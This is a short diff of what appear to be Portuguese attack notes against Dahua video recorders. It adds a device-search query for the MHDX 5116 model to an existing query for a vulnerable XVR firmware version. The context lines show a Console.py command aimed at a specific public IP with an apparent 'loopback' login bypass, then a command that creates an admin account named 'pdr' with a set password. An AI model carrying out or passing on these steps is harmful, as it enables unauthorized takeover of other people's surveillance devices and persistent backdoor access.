@@ -4,6 +4,8 @@ e roda, pra ver se conecta no console
 
 Dahua product:"Dahua XVR" version:"3.218.0000001.4"
 
+MHDX 5116 product:"Dahua MHDX 5116"
+
 python3 Console.py --proto dhip --rport 80 --logon loopback --rhost 101.190.9.204
 
 usermgr add pdr Senha@2026 admin
